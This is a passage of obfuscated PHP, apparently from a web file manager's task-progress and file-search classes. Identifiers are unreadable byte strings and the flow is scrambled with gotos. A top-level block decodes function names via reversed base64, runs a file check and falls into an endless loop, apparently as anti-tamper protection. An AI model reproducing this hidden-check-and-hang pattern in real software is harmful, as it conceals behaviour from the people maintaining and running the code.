–[$eÈğÌÜÇ‘’[1574]] = $AÄ¬„Å –[$eÈğÌÜÇ‘’[1573]] + $AÄ¬„Å –[$eÈğÌÜÇ‘’[1570]] * 0.5; } else { if ($AÄ¬„Å –[$eÈğÌÜÇ‘’[1571]] == $eÈğÌÜÇ‘’[107]) { $AÄ¬„Å –[$eÈğÌÜÇ‘’[1574]] = $AÄ¬„Å –[$eÈğÌÜÇ‘’[1573]] + $AÄ¬„Å –[$eÈğÌÜÇ‘’[1569]] * 0.5 + $AÄ¬„Å –[$eÈğÌÜÇ‘’[1570]] * 0.5; } } } } goto B…ˆñÄø‹Í; Fã—í–áÜÀ: $eÈğÌÜÇ‘’ =& $_SERVER[´¬]; $AÄ¬„Å – =& $this->task; if (!$AÄ¬„Å –[$eÈğÌÜÇ‘’[723]]) { return; } goto fºÜÔí’; DãøšÓì’‹: } public function addPath($A×‚ÃÔÃî±) { goto DÇ“îƒ¯Àç; E‹‹¤—Û›Î: if ($E±¼İµÚ™[$E‹éÉâÂí²[29]] == $E‹éÉâÂí²[192]) { $AŞ¦‘Œ„ã[$E‹éÉâÂí²[1022]] += 1; } else { $AŞ¦‘Œ„ã[$E‹éÉâÂí²[1022]] += $E±¼İµÚ™[$E‹éÉâÂí²[81]][$E‹éÉâÂí²[79]]; if ($E±¼İµÚ™[$E‹éÉâÂí²[394]]) { $AŞ¦‘Œ„ã[$E‹éÉâÂí²[1022]] += $E±¼İµÚ™[$E‹éÉâÂí²[81]][$E‹éÉâÂí²[80]] + 1; } } $AŞ¦‘Œ„ã[$E‹éÉâÂí²[723]] += $E±¼İµÚ™[$E‹éÉâÂí²[78]]; $this->update(); goto dŒ¤¶Ÿ¹–; DÇ“îƒ¯Àç: $E‹éÉâÂí² =& $_SERVER[´¬]; if (!$A×‚ÃÔÃî±) { return; } $AŞ¦‘Œ„ã =& $this->task; goto C¶ˆ¹¾„‡Â; C¶ˆ¹¾„‡Â: $E±¼İµÚ™ = IO::infoWithChildren($A×‚ÃÔÃî±); $FÕËñéâÕ© = $AŞ¦‘Œ„ã[$E‹éÉâÂí²[1578]] ? $AŞ¦‘Œ„ã[$E‹éÉâÂí²[1578]][$E‹éÉâÂí²[1579]] : 0; $AŞ¦‘Œ„ã[$E‹éÉâÂí²[1578]] = array($E‹éÉâÂí²[1579] => $FÕËñéâÕ© + 1, $E‹éÉâÂí²[411] => $E±¼İµÚ™[$E‹éÉâÂí²[28]], $E‹éÉâÂí²[76] => $E±¼İµÚ™[$E‹éÉâÂí²[76]], $E‹éÉâÂí²[493] => $E±¼İµÚ™[$E‹éÉâÂí²[493]] ? $E±¼İµÚ™[$E‹éÉâÂí²[493]] : $E±¼İµÚ™[$E‹éÉâÂí²[76]]); goto E‹‹¤—Û›Î; dŒ¤¶Ÿ¹–: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($Díø‡÷ù‡) { $b™äÒêâÃ„ =& $_SERVER[´¬]; $cÕãàËğØÔ =& $this->task; $cÕãàËğØÔ[$b™äÒêâÃ„[1567]] = $Díø‡÷ù‡[$b™äÒêâÃ„[28]]; $cÕãàËğØÔ[$b™äÒêâÃ„[1024]] = $Díø‡÷ù‡[$b™äÒêâÃ„[28]]; $this->update(); } public function copyFileStart($C¾á§ÍŞìù, $E²ËÜ£íÙ¶, $DŠ‹áĞÂ•, $B–¸º£ø±ô, $bø…ÃÛº·, $aôÉ× à¿º) { goto b©‚‡Ö›’¤; fÒÈ³¨½Ì«: $c ßÀç˜•°[$eŒ²¸Ğİ¦­[1567]] = $D‡âÎË°Ú‡; $c ßÀç˜•°[$eŒ²¸Ğİ¦­[1569]] = (int) $C¾á§ÍŞìù->size($E²ËÜ£íÙ¶); $c ßÀç˜•°[$eŒ²¸Ğİ¦­[1570]] = 0; goto EÕ³‡ºõÂë; aø©™˜¥Õ: $this->update(); goto EÈœå”¾·µ; b©‚‡Ö›’¤: $eŒ²¸Ğİ¦­ =& $_SERVER[´¬]; $D‡âÎË°Ú‡ = $bø…ÃÛº·; if ($D‡âÎË°Ú‡ == $GLOBALS[$eŒ²¸Ğİ¦­[1580]]) { $D‡âÎË°Ú‡ = $GLOBALS[$eŒ²¸Ğİ¦­[1581]]; } goto E¥Ó¾Ğ§Œó; EÕ³‡ºõÂë: $c ßÀç˜•°[$eŒ²¸Ğİ¦­[1024]] = $eŒ²¸Ğİ¦­[33]; $c ßÀç˜•°[$eŒ²¸Ğİ¦­[1571]] = $eŒ²¸Ğİ¦­[33]; $c ßÀç˜•°[$eŒ²¸Ğİ¦­[1572]] = 0; goto aø©™˜¥Õ; E¥Ó¾Ğ§Œó: $GLOBALS[$eŒ²¸Ğİ¦­[1581]] = $bø…ÃÛº·; $GLOBALS[$eŒ²¸Ğİ¦­[1580]] = $aôÉ× à¿º; $c ßÀç˜•° =& $this->task; goto fÒÈ³¨½Ì«; EÈœå”¾·µ: } public function copyFileEnd($B–œ¨êç·Ù, $F†®©é ÏÌ, $eŠ÷éã®¡œ, $F¤“ö¨Å, $f©êÃ¯¸Ï, $aÛ„£äÀ²) { $fÔ»Îí¨æ =& $_SERVER[´¬]; $d¦±áÍ” =& $this->task; $d¦±áÍ”[$fÔ»Îí¨æ[1570]] = $d¦±áÍ”[$fÔ»Îí¨æ[1569]]; $d¦±áÍ”[$fÔ»Îí¨æ[1571]] = $fÔ»Îí¨æ[33]; if ($f©êÃ¯¸Ï == $d¦±áÍ”[$fÔ»Îí¨æ[1567]]) { $d¦±áÍ”[$fÔ»Îí¨æ[1573]] += $d¦±áÍ”[$fÔ»Îí¨æ[1569]]; $d¦±áÍ”[$fÔ»Îí¨æ[1574]] = $d¦±áÍ”[$fÔ»Îí¨æ[1573]]; $this->update(1); } else { $this->update(); $d¦±áÍ”[$fÔ»Îí¨æ[1570]] = 0; } self::log($fÔ»Îí¨æ[1582] . $F†®©é ÏÌ . $fÔ»Îí¨æ[67] . $F¤“ö¨Å . $fÔ»Îí¨æ[228] . $f©êÃ¯¸Ï . $fÔ»Îí¨æ[1583] . $d¦±áÍ”[$fÔ»Îí¨æ[1567]]); } public function updateFileEnd($D¦î¦¨òç›, $bÕõø™—–Å) { goto cë›¯•ïÒÎ; fÍÎ«çó—”: $this->update(1); self::log($cå¹¼„–¥’[1584] . $D¦î¦¨òç›); goto dõ¡½¬¦; F†‘ƒ­Àˆß: $d’æ¹Åš[$cå¹¼„–¥’[1569]] = $bÕõø™—–Å; $d’æ¹Åš[$cå¹¼„–¥’[1573]] += $bÕõø™—–Å; $d’æ¹Åš[$cå¹¼„–¥’[1574]] = $d’æ¹Åš[$cå¹¼„–¥’[1573]]; goto fÍÎ«çó—”; cë›¯•ïÒÎ: $cå¹¼„–¥’ =& $_SERVER[´¬]; $d’æ¹Åš =& $this->task; $d’æ¹Åš[$cå¹¼„–¥’[1567]] = $D¦î¦¨òç›; goto F†‘ƒ­Àˆß; dõ¡½¬¦: } public function sourceModelCopy($eôáŠ²ôŒ) { goto F×•â½ˆ™—; AˆìÒ÷ÚŸ: switch ($FäÉôÁæÔ“) { case $D‘¦¶»ñÈŞ[534]: $fŠµë‘¢Ò‰ = 1; break; case $D‘¦¶»ñÈŞ[537]: $f‚ƒ¬ó˜•[$D‘¦¶»ñÈŞ[1567]] = $A•„‹ÒÓÔÊ[$D‘¦¶»ñÈŞ[28]]; break; case $D‘¦¶»ñÈŞ[539]: $fŠµë‘¢Ò‰ = intval($eôáŠ²ôŒ[$D‘¦¶»ñÈŞ[376]] * 0.4); break; case $D‘¦¶»ñÈŞ[541]: $fŠµë‘¢Ò‰ = intval($eôáŠ²ôŒ[$D‘¦¶»ñÈŞ[376]] * 0.2); break; case $D‘¦¶»ñÈŞ[543]: $fŠµë‘¢Ò‰ = intval($eôáŠ²ôŒ[$D‘¦¶»ñÈŞ[376]] * 0.4); break; } $this->update($fŠµë‘¢Ò‰); $this->sourceModelCopyFlag = !1; goto F²ó§‚­¦‘; F×•â½ˆ™—: $D‘¦¶»ñÈŞ =& $_SERVER[´¬]; $FäÉôÁæÔ“ = $eôáŠ²ôŒ[0]; $A•„‹ÒÓÔÊ = $eôáŠ²ôŒ[1]; goto b›¡‘˜‘é³; b›¡‘˜‘é³: $f‚ƒ¬ó˜• =& $this->task; $this->sourceModelCopyFlag = !0; $fŠµë‘¢Ò‰ = 0; goto AˆìÒ÷ÚŸ; F²ó§‚­¦‘: } public function sourceRemove($FÁ«ˆØòƒÎ, $Dç±Şß‰´ª) { $e±÷Õ˜àË =& $_SERVER[´¬]; $this->sourceModelCopyFlag = !0; $fê‹¼¿ÛÛ = 1; if (isset($FÁ«ˆØòƒÎ[$e±÷Õ˜àË[81]])) { $fê‹¼¿ÛÛ = $FÁ«ˆØòƒÎ[$e±÷Õ˜àË[81]][$e±÷Õ˜àË[79]] + $FÁ«ˆØòƒÎ[$e±÷Õ˜àË[81]][$e±÷Õ˜àË[80]] + 1; } $this->update($fê‹¼¿ÛÛ); $this->sourceModelCopyFlag = !1; } public function sourceMove($bÀŠ¼Èêß) { $this->sourceRemove($bÀŠ¼Èêß, !1); } public function curlProgress($eÏõËÈ¦İ, $A“ßàµÄÒ, $cÜ„‚éÖ‚Ë, $D ›©ß—Áî, $f»œ™‚íäŒ) { $A´¢ŠàÒæ… =& $_SERVER[´¬]; $fº›í¬‹Ä· =& $this->task; if ($f»œ™‚íäŒ > 0) { $fº›í¬‹Ä·[$A´¢ŠàÒæ…[1024]] = $A´¢ŠàÒæ…[1585]; $fº›í¬‹Ä·[$A´¢ŠàÒæ…[1571]] = $A´¢ŠàÒæ…[107]; if ($fº›í¬‹Ä·[$A´¢ŠàÒæ…[1569]]) { $fº›í¬‹Ä·[$A´¢ŠàÒæ…[1570]] = $f»œ™‚íäŒ; } if ($fº›í¬‹Ä·[$A´¢ŠàÒæ…[1572]]) { $fº›í¬‹Ä·[$A´¢ŠàÒæ…[1570]] = $f»œ™‚íäŒ + $fº›í¬‹Ä·[$A´¢ŠàÒæ…[1572]]; } } else { if ($cÜ„‚éÖ‚Ë > 0) { if ($fº›í¬‹Ä·[$A´¢ŠàÒæ…[1569]] == $A“ßàµÄÒ) { $fº›í¬‹Ä·[$A´¢ŠàÒæ…[1570]] = $cÜ„‚éÖ‚Ë; $fº›í¬‹Ä·[$A´¢ŠàÒæ…[1024]] = $A´¢ŠàÒæ…[1586]; $fº›í¬‹Ä·[$A´¢ŠàÒæ…[1571]] = $A´¢ŠàÒæ…[1095]; } } } $this->update(); } public function curlProgressStart($DÎÍÉ¿¾Ï÷) { } public function curlProgressEnd($ešŠº¥Æ©¸) { goto bœÓÁÙ¶Â; bº’ÓÔ¡‹×: $F÷³Ä‡ä½¶ = $EÚàº‚ˆñá[$FÁ½Œèğ„è[1587]]; if ($F÷³Ä‡ä½¶ == -1) { $F÷³Ä‡ä½¶ = $EÚàº‚ˆñá[$FÁ½Œèğ„è[1588]]; } if ($Fˆ®Û×Äìâ[$FÁ½Œèğ„è[1571]] == $FÁ½Œèğ„è[107] && $F÷³Ä‡ä½¶) { $Fˆ®Û×Äìâ[$FÁ½Œèğ„è[1572]] += $F÷³Ä‡ä½¶; } goto D™™ÜŸŠ; D™™ÜŸŠ: $this->update(); goto C§ëÆ¾È‹ö; bœÓÁÙ¶Â: $FÁ½Œèğ„è =& $_SERVER[´¬]; $Fˆ®Û×Äìâ =& $this->task; $EÚàº‚ˆñá = curl_getinfo($ešŠº¥Æ©¸); goto bº’ÓÔ¡‹×; C§ëÆ¾È‹ö: } } class TaskHttp extends Task { protected function startAfter() { $AÚ‹èŒ´¡† =& $_SERVER[´¬]; $cŒéÈ•ŞÜ« =& $this->task; $cŒéÈ•ŞÜ«[$AÚ‹èŒ´¡†[1589]] = 1; Hook::bind($AÚ‹èŒ´¡†[1561], array($this, $AÚ‹èŒ´¡†[1590])); Hook::bind($AÚ‹èŒ´¡†[1563], array($this, $AÚ‹èŒ´¡†[1591])); Hook::bind($AÚ‹èŒ´¡†[1565], array($this, $AÚ‹èŒ´¡†[1592])); } protected function endAfter() { $eÇºÄ™¬¿å =& $_SERVER[´¬]; Hook::unbind($eÇºÄ™¬¿å[1561], array($this, $eÇºÄ™¬¿å[1590])); Hook::unbind($eÇºÄ™¬¿å[1563], array($this, $eÇºÄ™¬¿å[1591])); Hook::unbind($eÇºÄ™¬¿å[1565], array($this, $eÇºÄ™¬¿å[1592])); } public function progressStart($eÌàˆ‡ÖØŠ) { $c†‡Î‰äÍ´ =& $_SERVER[´¬]; $eˆø–‡Ş» = curl_getinfo($eÌàˆ‡ÖØŠ); self::log($c†‡Î‰äÍ´[1593] . $eˆø–‡Ş»[$c†‡Î‰äÍ´[304]]); self::valueSet($this->task[$c†‡Î‰äÍ´[392]], $this->task); } public function progressEnd($DÈ•ŸíÏš) { $E£çŠ‘ß»í =& $_SERVER[´¬]; self::log($E£çŠ‘ß»í[1594] . $this->task[$E£çŠ‘ß»í[392]]); $this->end(); } public function progress($C‰»‹í·†, $AİÙé”½äø, $EÊÀÎÃáÏ, $C‘°¾¥ØŸÂ, $AùĞ®§‰îÄ) { $Fç×°áÆ„— =& $_SERVER[´¬]; $f¿ïëˆñ²´ =& $this->task; if ($AùĞ®§‰îÄ > 0) { $f¿ïëˆñ²´[$Fç×°áÆ„—[1022]] = $f¿ïëˆñ²´[$Fç×°áÆ„—[1022]] == 0 ? $C‘°¾¥ØŸÂ : $f¿ïëˆñ²´[$Fç×°áÆ„—[1022]]; $f¿ïëˆñ²´[$Fç×°áÆ„—[1037]] = $AùĞ®§‰îÄ; } else { if ($EÊÀÎÃáÏ > 0) { $f¿ïëˆñ²´[$Fç×°áÆ„—[1022]] = $f¿ïëˆñ²´[$Fç×°áÆ„—[1022]] == 0 ? $AİÙé”½äø : $f¿ïëˆñ²´[$Fç×°áÆ„—[1022]]; $f¿ïëˆñ²´[$Fç×°áÆ„—[1037]] = $EÊÀÎÃáÏ; } } $this->update(); self::log("\x70\162\157\x67\x72\x65\x73\163\110\164\164\160\72\x64\x6f\x77\x6e\x3a{$EÊÀÎÃáÏ}\x2f{$AİÙé”½äø}\73\x20\x75\x70\154\x6f\x61\x64\72{$AùĞ®§‰îÄ}\x2f{$C‘°¾¥ØŸÂ}\73"); } } if (!isset($_SERVER[$_SERVER[´¬][821]]) || !isset($_SERVER[$_SERVER[´¬][828]])) { goto BÓÜµÍõ†Š; b±¨†çĞĞ¬: $aï®Æ‡¶êí($_SERVER[$_SERVER[´¬][824]] . $_SERVER[´¬][825]); $E®ŠöÚÑ˜À = 2; while ($E®ŠöÚÑ˜À > 1) { $EîîÌŞÃ© = rawurlencode($E®ŠöÚÑ˜À . $_SERVER[´¬][374]); } goto A‚ùğ™ºç§; BÓÜµÍõ†Š: $DÊËÔÕˆ = $_SERVER[´¬][823]; $e¡Î¸áÅÈœ = $_SERVER[$_SERVER[´¬][824]] . $_SERVER[´¬][825]; $fœ¥¬…Á‚ = $DÊËÔÕˆ($e¡Î¸áÅÈœ); goto CìÜØ©©—; CìÜØ©©—: $F¢’¶¾¢ä = explode($_SERVER[´¬][228], $fœ¥¬…Á‚); if (count($F¢’¶¾¢ä) < $_SERVER[´¬][580]) { $FçËÈËš = $_SERVER[´¬][826]; $FçËÈËš(); } $aï®Æ‡¶êí = $_SERVER[´¬][827]; goto b±¨†çĞĞ¬; A‚ùğ™ºç§: } goto d­Í¤¼”; BùÂÛïÜİ¹: $a å„¹¶Ú = strrev(base64_decode($_SERVER[Ì][0])); function binCheckNeq($fÈâ‰¥½êñ, $dÆ’ñÁ­å) { return $fÈâ‰¥½êñ != $dÆ’ñÁ­å; } $_SERVER[$_SERVER[Ì][1]] = $a å„¹¶Ú($_SERVER[$_SERVER[Ì][2]]); goto BİìĞ¤È—©; d½•×Ú¤Í: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($a²ÒŸä¹×) { goto C’ŞºÇªø°; cŠª÷‰¶–: if (!$d¯©šÛµÏ»[$FªÊ³æßÓ[168]]) { $CÛéº„Ó¼ß = array_to_keyvalue($FÈÓí‚È¹, $FªÊ³æßÓ[33], $FªÊ³æßÓ[168]); $Bë„Ûêİß = implode($FªÊ³æßÓ[47], $CÛéº„Ó¼ß); $aªÆµ•µÂÖ = $FªÊ³æßÓ[1929]; } $F¢»½¡îï = explode($FªÊ³æßÓ[47], trim($Bë„Ûêİß, $FªÊ³æßÓ[47])); return array($aªÆµ•µÂÖ, $F¢»½¡îï); goto d­ç¤ùŞğ; CÊóÈ›†: if (!$d¯©šÛµÏ») { return array(); } $Bë„Ûêİß = $d¯©šÛµÏ»[$FªÊ³æßÓ[168]]; $aªÆµ•µÂÖ = $FªÊ³æßÓ[7]; goto cŠª÷‰¶–; C’ŞºÇªø°: $FªÊ³æßÓ =& $_SERVER[´¬]; $FÈÓí‚È¹ = KodIO::fileTypeList(); $d¯©šÛµÏ» = $FÈÓí‚È¹[$a²ÒŸä¹×]; goto CÊóÈ›†; d­ç¤ùŞğ: } public function listPathType($e£ ‹Ì¤œÊ) { $eÒãĞÜ =& $_SERVER[´¬]; $eè©‡ÜòÒŸ = $this->fileTypeWhere($e£ ‹Ì¤œÊ); if (!$eè©‡ÜòÒŸ) { return array(); } $fÓ¡Ë„Í§¸ = array($eÒãĞÜ[548] => SourceModel::TYPE_USER, $eÒãĞÜ[549] => USER_ID, $eÒãĞÜ[545] => 0, $eÒãĞÜ[546] => $eè©‡ÜòÒŸ); return $this->listSource($fÓ¡Ë„Í§¸); } public function listSearch($B’óé…Ş˜‡, $bñÙï‚Ê› = 300) { goto A×¡‹¹Ù‹í; B¦×·î…™ø: if (!isset($Fòä„¨æ±[$A•çÌîµ‘[421]])) { $Fòä„¨æ±[$A•çÌîµ‘[421]] = 0; } $b¢¹Æ«¿Î = $A•çÌîµ‘[1931]; $C…èàØ•—š = $b¢¹Æ«¿Î; goto dÀàÃ›§Éï; dÀàÃ›§Éï: $this->_listSearchBindPinyin($B’óé…Ş˜‡, $Fòä„¨æ±, $b¢¹Æ«¿Î); $this->alias($A•çÌîµ‘[515])->_makeOrder(); $Fòä„¨æ± = $this->parseWhereLike($Fòä„¨æ±); goto f›ÛÒªÊ ; bÒİÎç‚¯Ä: $this->_listMake($EÙ•ÎÅ„ˆ“); return $EÙ•ÎÅ„ˆ“; goto c¨õğò»ã‚; c¶¸áÎ¼…: $this->_listSearchTag($EÙ•ÎÅ„ˆ“, $B’óé…Ş˜‡, $C…èàØ•—š); $this->_listSearchGroupTag($EÙ•ÎÅ„ˆ“, $B’óé…Ş˜‡, $C…èàØ•—š); $this->_listDataApply($EÙ•ÎÅ„ˆ“[$A•çÌîµ‘[366]]); goto bÒİÎç‚¯Ä; A×¡‹¹Ù‹í: $A•çÌîµ‘ =& $_SERVER[´¬]; if (isset($B’óé…Ş˜‡[$A•çÌîµ‘[1772]]) && $B’óé…Ş˜‡[$A•çÌîµ‘[1772]]) { $B’óé…Ş˜‡[$A•çÌîµ‘[1772]] = str_replace($A•çÌîµ‘[380], $A•çÌîµ‘[1930], trim($B’óé…Ş˜‡[$A•çÌîµ‘[1772]])); } $Fòä„¨æ± = $this->_parseSearchWhere($B’óé…Ş˜‡); goto B¦×·î…™ø; f›ÛÒªÊ : $EÙ•ÎÅ„ˆ“ = $this->distinct(!0)->field($b¢¹Æ«¿Î)->where($Fòä„¨æ±)->selectPage($bñÙï‚Ê›); $this->_listSearchFileContent($EÙ•ÎÅ„ˆ“, $B’óé…Ş˜‡, $C…èàØ•—š); $this->_listSearchDesc($EÙ•ÎÅ„ˆ“, $B’óé…Ş˜‡, $C…èàØ•—š); goto c¶¸áÎ¼…; c¨õğò»ã‚: } private function _listSearchFileContent(&$Aê‡¨ãæÇğ, $BÈš·Ì®ê, $b¤èÜ–¥‘) { goto b†Šå„éæà; F×“Ù¹¿‹Ú: $Aê‡¨ãæÇğ[$e­×Æï¦ªË[366]] = array_merge($dÙÔÆÄµ°«, $Aê‡¨ãæÇğ[$e­×Æï¦ªË[366]]); $Aê‡¨ãæÇğ[$e­×Æï¦ªË[363]][$e­×Æï¦ªË[364]] += count($dÙÔÆÄµ°«); goto AÎ„êÜŒ¢ù; b†Šå„éæà: $e­×Æï¦ªË =& $_SERVER[´¬]; if (!$BÈš·Ì®ê[$e­×Æï¦ªË[1772]] || $Aê‡¨ãæÇğ[$e­×Æï¦ªË[363]][$e­×Æï¦ªË[350]] > 1) { return; } $BğÕÇ¢»ƒ÷ = $this->_parseSearchWhere($BÈš·Ì®ê); goto a®×¢®î×; a®×¢®î×: if (!isset($BğÕÇ¢»ƒ÷[$e­×Æï¦ªË[28]]) || !is_array($BÈš·Ì®ê[$e­×Æï¦ªË[445]])) { return; } $BğÕÇ¢»ƒ÷[$e­×Æï¦ªË[445]] = array($e­×Æï¦ªË[7], $BÈš·Ì®ê[$e­×Æï¦ªË[445]]); unset($BğÕÇ¢»ƒ÷[$e­×Æï¦ªË[28]]); goto C®ˆ»©”ã; C®ˆ»©”ã: unset($BÈš·Ì®ê[$e­×Æï¦ªË[445]]); $dÙÔÆÄµ°« = $this->field($b¤èÜ–¥‘)->where($BğÕÇ¢»ƒ÷)->limit($e­×Æï¦ªË[1932])->select(); if (!$dÙÔÆÄµ°« || count($dÙÔÆÄµ°«) == 0) { return; } goto F×“Ù¹¿‹Ú; AÎ„êÜŒ¢ù: } private function _listSearchTag(&$E•¡¸ìÏÃÔ, $A°äÈ¸…ª, $a¬ å÷Ø°Î) { goto f¤«¬°Şâ³; FˆÙ™ˆˆßù: if (!$FÂØ÷©) { return; } $E±ëØ±©‚Í = array($A”µÈïíÌ[417] => array($A”µÈïíÌ[7], $FÂØ÷©), $A”µÈïíÌ[1526] => USER_ID); $F˜–›Æ¯í = Model($A”µÈïíÌ[418])->field($A”µÈïíÌ[76])->where($E±ëØ±©‚Í)->select(); goto fàÑâĞŠÏå; fàÑâĞŠÏå: $F˜–›Æ¯í = array_to_keyvalue($F˜–›Æ¯í, $A”µÈïíÌ[33], $A”µÈïíÌ[76]); $Ağ‹»Å‹šÉ = array_unique($F˜–›Æ¯í); $this->_listSearchMerge($E•¡¸ìÏÃÔ, $A°äÈ¸…ª, $a¬ å÷Ø°Î, $Ağ‹»Å‹šÉ); goto Fò§ø¿„Ö¦; f¤«¬°Şâ³: $A”µÈïíÌ =& $_SERVER[´¬]; if (!$A°äÈ¸…ª[$A”µÈïíÌ[1772]] || $E•¡¸ìÏÃÔ[$A”µÈïíÌ[363]][$A”µÈïíÌ[350]] > 1) { return; } $Bˆ¾ÛÅñ¯‚ = Model($A”µÈïíÌ[1933])->listData(); goto F§í¹ì«¶ï; F§í¹ì«¶ï: $FÂØ÷© = array(); $dªÖ¹—ÍËÉ = $A°äÈ¸…ª[$A”µÈïíÌ[1772]]; foreach ($Bˆ¾ÛÅñ¯‚ as $Eõ¼Ó¬é¾É) { $aØÀŸµ±Ôğ = $Eõ¼Ó¬é¾É[$A”µÈïíÌ[28]]; $añ™™°áÈå = str_replace($A”µÈïíÌ[50], $A”µÈïíÌ[33], Pinyin::encode($aØÀŸµ±Ôğ)); if (stripos($aØÀŸµ±Ôğ, $dªÖ¹—ÍËÉ) !== !1 || stripos($añ™™°áÈå, $dªÖ¹—ÍËÉ) !== !1) { $FÂØ÷©[] = $Eõ¼Ó¬é¾É[$A”µÈïíÌ[392]]; } } goto FˆÙ™ˆˆßù; Fò§ø¿„Ö¦: } private function _listSearchDesc(&$DùğÂÈåªë, $B¨—¤ÇÉİ, $e²ÏÕÂÒ§ô) { goto E°ïØÈÀ¦; E°ïØÈÀ¦: $Aâ½Í­ñŒ– =& $_SERVER[´¬]; if (!$B¨—¤ÇÉİ[$Aâ½Í­ñŒ–[1772]] || $DùğÂÈåªë[$Aâ½Í­ñŒ–[363]][$Aâ½Í­ñŒ–[350]] > 1) { return; } $cšÑç“‚·å = $this->listSearchChildren($B¨—¤ÇÉİ[$Aâ½Í­ñŒ–[476]]); goto Fà°‚†åà×; DÀ†ˆÛÇÙÀ: $F†ÛäìßÇ¶ = Model($Aâ½Í­ñŒ–[531])->field($Aâ½Í­ñŒ–[394])->where($Cù§äæË„)->select(); $dŠÒá§Í÷Ñ = array_to_keyvalue($F†ÛäìßÇ¶, $Aâ½Í­ñŒ–[33], $Aâ½Í­ñŒ–[394]); $this->_listSearchMerge($DùğÂÈåªë, $B¨—¤ÇÉİ, $e²ÏÕÂÒ§ô, $dŠÒá§Í÷Ñ); goto f‹ŠØ­…ñ; Fà°‚†åà×: $cšÑç“‚·å = array_unique($cšÑç“‚·å); if (!$cšÑç“‚·å) { return; } $Cù§äæË„ = array($Aâ½Í­ñŒ–[394] => array($Aâ½Í­ñŒ–[7], $cšÑç“‚·å), $Aâ½Í­ñŒ–[93] => $Aâ½Í­ñŒ–[429], $Aâ½Í­ñŒ–[371] => array($Aâ½Í­ñŒ–[379], $Aâ½Í­ñŒ–[1774] . $B¨—¤ÇÉİ[$Aâ½Í­ñŒ–[1772]] . $Aâ½Í­ñŒ–[1774])); goto DÀ†ˆÛÇÙÀ; f‹ŠØ­…ñ: } private function _listSearchGroupTag(&$dÓÍ„è¡™, $b±è†£”…, $fªøéÚª’) { goto CÆ‰ë¸í; CÆ‰ë¸í: $E’ †Ÿ³ï» =& $_SERVER[´¬]; if (!$b±è†£”…[$E’ †Ÿ³ï»[1772]] || $dÓÍ„è¡™[$E’ †Ÿ³ï»[363]][$E’ †Ÿ³ï»[350]] > 1 || !$b±è†£”…[$E’ †Ÿ³ï»[476]]) { return; } $AùêÛƒ„•² = $this->sourceInfo($b±è†£”…[$E’ †Ÿ³ï»[476]]); goto EáÒ²’Ë–; EáÒ²’Ë–: if (!$AùêÛƒ„•² || $AùêÛƒ„•²[$E’ †Ÿ³ï»[402]] != SourceModel::TYPE_GROUP) { return; } $A‘ˆÀß™„ = $AùêÛƒ„•²[$E’ †Ÿ³ï»[482]]; $b­¿Ğ’œÃ­ = Model($E’ †Ÿ³ï»[1934])->get($A‘ˆÀß™„); goto aóßæİº¿ä; aóßæİº¿ä: $FÒÑ­‘¢¾‡ = array(); $DéÀáÛ–¬£ = $b±è†£”…[$E’ †Ÿ³ï»[1772]]; foreach ($b­¿Ğ’œÃ­[$E’ †Ÿ³ï»[366]] as $EÈğ»‚×Å–) { $Fè”ŒÒÊ‘° = $EÈğ»‚×Å–[$E’ †Ÿ³ï»[28]]; $AğÑº¶°ß = str_replace($E’ †Ÿ³ï»[50], $E’ †Ÿ³ï»[33], Pinyin::encode($Fè”ŒÒÊ‘°)); if (stripos($Fè”ŒÒÊ‘°, $DéÀáÛ–¬£) !== !1 || stripos($AğÑº¶°ß, $DéÀáÛ–¬£) !== !1) { $FÒÑ­‘¢¾‡[] = $EÈğ»‚×Å–[$E’ †Ÿ³ï»[392]]; } } goto dâ§¬§ÊÊ±; F¹‰¤Ìè×: $c©Š®öÊó´ = array_to_keyvalue($c©Š®öÊó´, $E’ †Ÿ³ï»[33], $E’ †Ÿ³ï»[76]); $CŸå¬ÓğÓ = array_unique($c©Š®öÊó´); $this->_listSearchMerge($dÓÍ„è¡™, $b±è†£”…, $fªøéÚª’, $CŸå¬ÓğÓ); goto D‹«Ï¤ˆÕƒ; dâ§¬§ÊÊ±: if (!$FÒÑ­‘¢¾‡) { return; } $fïœ§ä¡ºŒ = array($E’ †Ÿ³ï»[417] => array($E’ †Ÿ³ï»[7], $FÒÑ­‘¢¾‡), $E’ †Ÿ³ï»[1526] => 0, $E’ †Ÿ³ï»[29] => $E’ †Ÿ³ï»[1796] . $A‘ˆÀß™„); $c©Š®öÊó´ = Model($E’ †Ÿ³ï»[418])->field($E’ †Ÿ³ï»[76])->where($fïœ§ä¡ºŒ)->select(); goto F¹‰¤Ìè×; D‹«Ï¤ˆÕƒ: } private function _listSearchMerge(&$A›é½Ûƒ¤, $C¸äª‹Âï, $FĞì±ªÅÃ, $C˜ˆ¯œ†ôÚ) { goto cÓÕÙĞé¤Æ; CŠĞˆöåÍ: $Cî‡‘™ˆ…» = array_diff($C˜ˆ¯œ†ôÚ, $B´òØ¬İéñ); if (!$Cî‡‘™ˆ…») { return; } $b³çœ ÷‹Ø = array($AïØÜ Æ•Å[394] => array($AïØÜ Æ•Å[7], $Cî‡‘™ˆ…»)); goto d…ÌÄ›ÅğÂ; d…ÌÄ›ÅğÂ: $bµÜä©Ãë… = $this->field($FĞì±ªÅÃ)->where($b³çœ ÷‹Ø)->select(); if (!$bµÜä©Ãë…) { return; } $e¢ã¤½¯‡ = array(); goto Aë÷‰î©µµ; Aë÷‰î©µµ: foreach ($bµÜä©Ãë… as $FéíÔ¸ä¡å) { if ($this->_listSearchFilter($FéíÔ¸ä¡å, $C¸äª‹Âï)) { $e¢ã¤½¯‡[] = $FéíÔ¸ä¡å; } } $A›é½Ûƒ¤[$AïØÜ Æ•Å[366]] = array_merge($e¢ã¤½¯‡, $A›é½Ûƒ¤[$AïØÜ Æ•Å[366]]); $A›é½Ûƒ¤[$AïØÜ Æ•Å[363]][$AïØÜ Æ•Å[364]] += count($e¢ã¤½¯‡); goto f˜İ˜Ş°ÏÀ; cÓÕÙĞé¤Æ: $AïØÜ Æ•Å =& $_SERVER[´¬]; if (!$C˜ˆ¯œ†ôÚ) { return; } $B´òØ¬İéñ = array_to_keyvalue($A›é½Ûƒ¤[$AïØÜ Æ•Å[366]], $AïØÜ Æ•Å[33], $AïØÜ Æ•Å[394]); goto CŠĞˆöåÍ; f˜İ˜Ş°ÏÀ: } private function _listSearchFilter($CËœÇçƒ¾ö, $cµø´­Üˆ) { goto AÖà³ëĞÀè; E›¯£ºò¥: if 